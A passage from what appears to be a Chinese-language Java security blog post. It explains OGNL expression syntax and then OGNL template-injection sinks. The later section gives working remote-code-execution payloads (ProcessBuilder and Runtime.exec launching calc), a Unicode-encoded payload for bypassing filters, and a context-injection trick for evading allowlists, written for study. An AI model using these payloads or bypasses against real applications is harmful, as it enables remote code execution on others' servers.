+</span></span></code></pre></td></tr></table></div></div><p><strong>(5) 对数组和集合的访问</strong></p><p>OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>testAccessCollections</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HashMap</span><span class=o>&lt;&gt;();</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span><span class=o>[]</span> <span class=n>strings</span>  <span class=o>=</span> <span class=o>{</span><span class=s>&#34;str-aa&#34;</span><span class=o>,</span> <span class=s>&#34;str-bb&#34;</span><span class=o>};</span>
+</span></span><span class=line><span class=cl>    <span class=n>ArrayList</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span> <span class=n>list</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ArrayList</span><span class=o>&lt;&gt;();</span>
+</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>.</span><span class=na>add</span><span class=o>(</span><span class=s>&#34;list-aa&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>.</span><span class=na>add</span><span class=o>(</span><span class=s>&#34;list-bb&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>String</span><span class=o>&gt;</span> <span class=n>map</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HashMap</span><span class=o>&lt;&gt;();</span>
+</span></span><span class=line><span class=cl>    <span class=n>map</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;key1&#34;</span><span class=o>,</span> <span class=s>&#34;value1&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>map</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;key2&#34;</span><span class=o>,</span> <span class=s>&#34;value2&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;list&#34;</span><span class=o>,</span> <span class=n>list</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;strings&#34;</span><span class=o>,</span> <span class=n>strings</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;map&#34;</span><span class=o>,</span> <span class=n>map</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>user</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span><span class=o>[]</span> <span class=n>expressions</span> <span class=o>=</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#strings[0]&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#list[0]&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#list[0 + 1]&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#map[&#39;key1&#39;]&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#map[&#39;key&#39; + &#39;2&#39;]&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>};</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=n>String</span> <span class=n>express</span> <span class=o>:</span> <span class=n>expressions</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>express</span><span class=o>,</span><span class=n>context</span><span class=o>,</span> <span class=n>user</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=n>express</span><span class=o>+</span><span class=s>&#34; = &#34;</span><span class=o>+</span><span class=n>value</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>输出如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#strings[0] = str-aa
+</span></span><span class=line><span class=cl>#list[0] = list-aa
+</span></span><span class=line><span class=cl>#list[0 + 1] = list-bb
+</span></span><span class=line><span class=cl>#map[&#39;key1&#39;] = value1
+</span></span><span class=line><span class=cl>#map[&#39;key&#39; + &#39;2&#39;] = value2
+</span></span></code></pre></td></tr></table></div></div><p><strong>(6) 投影与选择</strong></p><p>OGNL 支持类似数据库当中的选择与投影功能。</p><ul><li><p><strong>投影</strong>：选出集合当中的相同属性组合成一个新的集合。语法为 <code>collection.{XXX}</code> ，<code>XXX</code> 就是集合中每个元素的公共属性。</p></li><li><p><strong>选择</strong>：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 <code>collection.{Y XXX}</code> ，其中 <code>Y</code> 是一个选择操作符，<code>XXX</code> 是选择用的逻辑表达式。</p></li></ul><p>选择操作符有 3 种：</p><ul><li><code>?</code> ：选择满足条件的所有元素</li><li><code>^</code> ：选择满足条件的第一个元素</li><li><code>$</code> ：选择满足条件的最后一个元素</li></ul><p>测试代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>testSelection</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>p1</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>(</span><span class=s>&#34;name1&#34;</span><span class=o>,</span> <span class=n>11</span><span class=o>,</span><span class=kc>null</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>p2</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>(</span><span class=s>&#34;name2&#34;</span><span class=o>,</span> <span class=n>22</span><span class=o>,</span><span class=kc>null</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>p3</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>(</span><span class=s>&#34;name3&#34;</span><span class=o>,</span> <span class=n>33</span><span class=o>,</span><span class=kc>null</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>User</span> <span class=n>p4</span> <span class=o>=</span> <span class=k>new</span> <span class=n>User</span><span class=o>(</span><span class=s>&#34;name4&#34;</span><span class=o>,</span> <span class=n>44</span><span class=o>,</span><span class=kc>null</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=o>,</span> <span class=n>Object</span><span class=o>&gt;</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HashMap</span><span class=o>&lt;&gt;();</span>
+</span></span><span class=line><span class=cl>    <span class=n>ArrayList</span><span class=o>&lt;</span><span class=n>User</span><span class=o>&gt;</span> <span class=n>list</span> <span class=o>=</span> <span class=k>new</span> <span class=n>ArrayList</span><span class=o>&lt;&gt;();</span>
+</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>.</span><span class=na>add</span><span class=o>(</span><span class=n>p1</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>.</span><span class=na>add</span><span class=o>(</span><span class=n>p2</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>.</span><span class=na>add</span><span class=o>(</span><span class=n>p3</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>list</span><span class=o>.</span><span class=na>add</span><span class=o>(</span><span class=n>p4</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;list&#34;</span><span class=o>,</span> <span class=n>list</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span><span class=o>[]</span> <span class=n>expressions</span> <span class=o>=</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#list.{age}&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#list.{age + &#39;-&#39; + name}&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#list.{? #this.age &gt; 22}&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#list.{^ #this.age &gt; 22}&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#list.{$ #this.age &gt; 22}&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>};</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=n>String</span> <span class=n>express</span> <span class=o>:</span> <span class=n>expressions</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>express</span><span class=o>,</span><span class=n>context</span><span class=o>,</span> <span class=k>new</span> <span class=n>User</span><span class=o>());</span>
+</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=n>express</span><span class=o>+</span><span class=s>&#34; = &#34;</span><span class=o>+</span><span class=n>value</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>输出如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#list.{age} = [11, 22, 33, 44]
+</span></span><span class=line><span class=cl>#list.{age + &#39;-&#39; + name} = [11-name1, 22-name2, 33-name3, 44-name4]
+</span></span><span class=line><span class=cl>#list.{? #this.age &gt; 22} = [User(name=name3, age=33, address=null), User(name=name4, age=44, address=null)]
+</span></span><span class=line><span class=cl>#list.{^ #this.age &gt; 22} = [User(name=name3, age=33, address=null)]
+</span></span><span class=line><span class=cl>#list.{$ #this.age &gt; 22} = [User(name=name4, age=44, address=null)]
+</span></span></code></pre></td></tr></table></div></div><p><strong>(7) 创建对象</strong></p><p>OGNL 支持直接使用表达式来创建对象。主要有三种情况：</p><ul><li>构造 List 对象：使用 <code>{}</code> , 中间使用 <code>,</code> 进行分割如 <code>{"aa", "bb", "cc"}</code> ;</li><li>构造 Map 对象：使用 <code>#{}</code> ，中间使用 <code>,</code> 进行分割键值对，键值对使用 <code>:</code> 区分，如 <code>#{"key1" : "value1", "key2" : "value2"}</code> ;</li><li>构造任意对象：直接使用已知的对象的构造方法进行构造。</li></ul><p>测试代码如下，可以看到， <strong>调用对象构造器创建对象后，还可以链式调用其方法</strong> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>testCreateObject</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span><span class=o>[]</span> <span class=n>expressions</span> <span class=o>=</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;#{&#39;key1&#39;:&#39;val1&#39;,&#39;key2&#39;:&#39;val2&#39;}&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;{1,2,3,4}&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;calc&#39;})).start()&#34;</span><span class=o>,</span>
+</span></span><span class=line><span class=cl>    <span class=o>};</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=o>(</span><span class=n>String</span> <span class=n>express</span> <span class=o>:</span> <span class=n>expressions</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>express</span><span class=o>,</span><span class=k>new</span> <span class=n>User</span><span class=o>());</span>
+</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=n>express</span><span class=o>+</span><span class=s>&#34; = &#34;</span><span class=o>+</span><span class=n>value</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>输出如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#{&#39;key1&#39;:&#39;val1&#39;,&#39;key2&#39;:&#39;val2&#39;} = {key1=val1, key2=val2}
+</span></span><span class=line><span class=cl>{1,2,3,4} = [1, 2, 3, 4]
+</span></span><span class=line><span class=cl>(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;calc&#39;})).start() = java.lang.ProcessImpl@722c41f4
+</span></span></code></pre></td></tr></table></div></div><h2 id=ognl其他特性>Ognl其他特性</h2><p>首先看到官方文档：</p><p><img src=/media/image-20210914141153559.png alt=image-20210914141153559></p><p>大概意思就是：</p><p>如果你在Ognl表达式后面再加一个带括号的表达式，并且括号前没有点号。例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#one(#two)
+</span></span></code></pre></td></tr></table></div></div><p>Ognl会将 <code>#one</code> 表达式的结算结果， <strong>再次作为一个Ognl表达式去解析</strong> ，并且会将括号内的表达式的计算结果作为本次解析的的root对象。</p><p>第一个表达式的计算结果可能是任何类型的对象，如果它是一个 <code>AST</code> 类型的对象，那么Ognl会使用这个 <code>AST</code> 对象去解析（对应的root对象就是括号内表达式的计算结果）。如果第一个表达式的计算结果不是一个 <code>AST</code> 类型的对象，那么Ognl会把它当成一个字符串进行处理，将其转成一个 <code>AST</code> 对象然后再去解析。</p><p>此外，可能存在一种冲突情况，例如我用如下方式进行上述操作：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>name(#two)
+</span></span></code></pre></td></tr></table></div></div><p>运行后将得到非预期结果，因为这里的 <code>name</code> 会被当成root对象的一个方法进行调用，将得到类似如下错误：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>NoSuchMethodException</span><span class=o>:</span> <span class=n>com</span><span class=o>.</span><span class=na>pinger</span><span class=o>.</span><span class=na>javasec</span><span class=o>.</span><span class=na>ssti</span><span class=o>.</span><span class=na>ognl</span><span class=o>.</span><span class=na>pojo</span><span class=o>.</span><span class=na>User</span><span class=o>.</span><span class=na>name</span><span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>要想能正常进行 <code>Expression Evaluation</code> ，需要将name括起来，强制性的进行 <code>Expression Evaluation</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(name)(#two)
+</span></span></code></pre></td></tr></table></div></div><p>这样，Ognl就不会把name当成root对象的方法来调用了。</p><h2 id=ognl-ssti-sink>Ognl SSTI Sink</h2><p><strong>(1) 常规手法</strong></p><p>Ognl SSTI，要能成功解析表达式，需要执行到 <code>Ognl.getValue()</code> 或者 <code>Ognl.setValue()</code> 才能成功触发。例如 <code>Ognl.setValue()</code> 触发RCE：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm> * Ognl setValue() SSTI
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkOne</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>expression</span><span class=o>=</span><span class=s>&#34;((new java.lang.ProcessBuilder(new java.lang.String[]{\&#34;calc\&#34;})).start())(1)&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>setValue</span><span class=o>(</span><span class=n>expression</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>例如 <code>Ognl.getValue()</code> 触发RCE：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm> * Ognl getValue() SSTI
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkTwo</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>expression</span><span class=o>=</span><span class=s>&#34;(new java.lang.ProcessBuilder(new java.lang.String[]{\&#34;calc\&#34;})).start()&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>expression</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里需要注意的就是，通过 <code>Ognl.setValue()</code> 方式来进行SSTI，需要使用Ognl的 <code>Expression Evaluation</code> 特性，否则不允许进行创建对象、调用静态方法等操作。而 <code>Ognl.getValue()</code> 则不需要考虑这个问题。</p><p>此外，还有如下Tips：</p><ul><li>如果目标存在黑名单，前面说过，Ognl支持链式调用，那么就可以在context或者root对象中，通过链式调用找到可以利用的对象，例如 <code>org.apache.tomcat.InstanceManager</code> 对象；</li><li>Ognl支持调用静态方法，所以可以使用 <code>@java.lang.Runtime@getRuntime().exec('calc')</code> 的方式进行RCE；</li><li>Ognl支持通过 <code>new</code> 创建对象，所以可以使用 <code>new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start()</code> 进行RCE；</li></ul><p><strong>(2) Bypass手法</strong></p><p>Ognl支持UNICODE编码的表达式，例如如下UNICODE编码的恶意表达式可以成功执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkFour</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// @java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>String</span> <span class=n>expression</span><span class=o>=</span><span class=s>&#34;\\u0040\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0040\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0027\\u0063\\u0061\\u006c\\u0063\\u0027\\u0029&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>expression</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>java.lang.ProcessImpl@7506e922
+</span></span></code></pre></td></tr></table></div></div><p>此外，前面说到，Ognl支持 <code>Expression Evaluation</code> 的特性，基于这个特性，如果我们无法直接执行恶意的表达式，那么我们可以 <strong>先将恶意的Ognl表达式注入到Ognl的context或者root中</strong> ，然后通过 <code>Expression Evaluation</code> 特性进行调用。如下所示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm> * 测试ExpressionEvaluation
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>testExpressionEvaluation</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// 绕过白名单检查，先讲恶意的Ognl表达式放入Ognl的上下文中
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>String</span> <span class=n>one</span><span class=o>=</span><span class=s>&#34;@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;one&#34;</span><span class=o>,</span><span class=n>one</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;two&#34;</span><span class=o>,</span><span class=s>&#34;twotow&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>attackStr</span><span class=o>=</span><span class=s>&#34;(#one)(#two)&#34;</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>value</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>attackStr</span><span class=o>,</span> <span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=n>value</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里并不是直接执行Ognl表达式，而是先想办法将恶意的Ognl表达式注入到context中，然后通过 <code>(#one)(#two)</code> 的方式（ <code>Expression Evaluation</code> 特性）进行触发。</p><p>最终值得一提的就是，很多时候想RCE，我们不必执着于寻找类似 <code>Runtime</code> 和 <code>ProcessBuilder</code> 等类， <code>JNDI</code> 和 <code>RMI</code> 等同样能RCE：）例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=err>#</span><span class=n>InstanceManager</span> <span class=o>=</span> <span class=err>#</span><span class=n>application</span><span class=o>[</span><span class=err>&#39;</span><span class=n>org</span><span class=o>.</span><span class=na>apache</span><span class=o>.</span><span class=na>tomcat</span><span class=o>.</span><span class=na>InstanceManager</span><span class=err>&#39;</span><span class=o>],</span>
